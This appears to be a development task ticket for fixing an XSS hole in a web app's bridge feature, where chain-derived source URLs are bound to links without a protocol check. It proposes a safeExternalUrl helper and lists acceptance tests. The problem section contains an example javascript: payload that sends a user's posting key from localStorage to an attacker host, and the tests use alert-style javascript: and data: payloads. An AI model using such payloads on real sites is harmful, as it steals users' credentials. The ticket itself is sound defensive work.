# UI-BRIDGE-SOURCE-HREF-PROTOCOL-VALIDATION — block `javascript:` / `data:` protocols in bridge external paper-source links

**Owner:** UI Agent
**Created:** 2026-05-30 (security audit follow-up workflow)
**Priority:** P2 (one-click XSS via attacker-crafted bridge entry; severity depends on who can author bridge json_metadata fields)

## Problem

The bridge feature renders external paper-source URLs from chain `json_metadata` via Alpine `:href` bindings without a protocol whitelist:

- `frontend/src/pages/paper-detail.js` — the bridge-paper source-URL `<a :href="...">` render (post-import or post-bridge view).
- `frontend/src/pages/bridge.js` — the bridge lookup preview, rendering source and PDF URLs.

Alpine's attribute binding safely escapes quote-breakout but does NOT block `javascript:`, `data:text/html`, or similar protocol-injection URLs. The markdown sanitizer's URL-protocol transformer (the chokepoint in `frontend/src/components/markdown-renderer.js`) is bypassed entirely here — these bindings read raw values from chain `json_metadata` and feed them to `:href` directly.

Clicking an attacker-crafted bridge entry whose source URL is `javascript:fetch('//attacker?'+localStorage.posting_key)` executes script same-origin under `pevo.app`.

Severity depends on who can author bridge `json_metadata` fields. If bridge entries can be authored by any Hive account (no accreditation gate), this is a higher-impact reflected XSS. If only accredited authors can populate the bridge fields, the surface is narrower but still a real one-click XSS sink. The fix is the same either way; this task does not depend on resolving that question.

## Goal

Wrap every bridge external URL render with a small `safeExternalUrl(url)` helper that returns the URL only if `new URL(url).protocol` is in `{'http:', 'https:'}`, else returns a safe fallback (`'#'` or `''`).

## Fix sketch

```js
// frontend/src/utils/safe-url.js (or co-located in a frontend utils module)
export function safeExternalUrl(url) {
  if (typeof url !== 'string' || !url) return '';
  try {
    const parsed = new URL(url, window.location.origin);
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      return parsed.href;
    }
  } catch {
    // fall through
  }
  return '';
}
```

Then in the two consuming files:

```js
// before
<a :href="sf.source_url" target="_blank">...</a>
// after
<a :href="safeExternalUrl(sf.source_url)" target="_blank" rel="noopener noreferrer">...</a>
```

Apply to every `:href` binding in the bridge surface that reads from `json_metadata` or chain-derived data. While touching these sites, also confirm `rel="noopener noreferrer"` is present (existing convention; flag in-place if missing).

Co-location decision (utils module vs inline): implementer's call; a shared util is preferred since this is reusable for any future external-URL render.

## Acceptance

1. **`javascript:` rejected.** Test: a bridge entry whose source URL is `javascript:alert(1)` renders with `href=""` (or whatever the safe fallback is). Click does NOT execute script.
2. **`data:text/html` rejected.** Same as (1) for `data:text/html,<script>alert(1)</script>`.
3. **`http:` and `https:` permitted.** Test: legitimate `https://arxiv.org/abs/...` URLs render unchanged and navigate normally.
4. **Both consumer files updated.** Grep confirms every `:href` binding in `frontend/src/pages/paper-detail.js` and `frontend/src/pages/bridge.js` that reads bridge / chain-derived data flows through `safeExternalUrl`.
5. **`rel="noopener noreferrer"` present** on every `target="_blank"` external link in the bridge surface (in-place fix if missing).
6. **Mutation-kill:** revert the protocol check → at least one of the rejection tests goes RED.

## Out of scope

- A site-wide audit of every `:href` / `:src` binding outside the bridge surface (the focused audit confirmed the rest of the surface is clean today; revisit if a new external-URL render lands).
- Backend-side validation of bridge `json_metadata` shape (the chain is the source of truth; the frontend defends at render).
- The question of who can author bridge entries (separate concern; the fix is needed regardless).

## References

- `frontend/src/pages/paper-detail.js` — bridge source-URL render.
- `frontend/src/pages/bridge.js` — bridge lookup preview render.
- `frontend/src/components/markdown-renderer.js` — the chokepoint that DOES block `javascript:` (reference for the protocol check pattern, plus the URL transformer used by DOMPurify).
- MDN: `URL` constructor and `protocol` property semantics.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
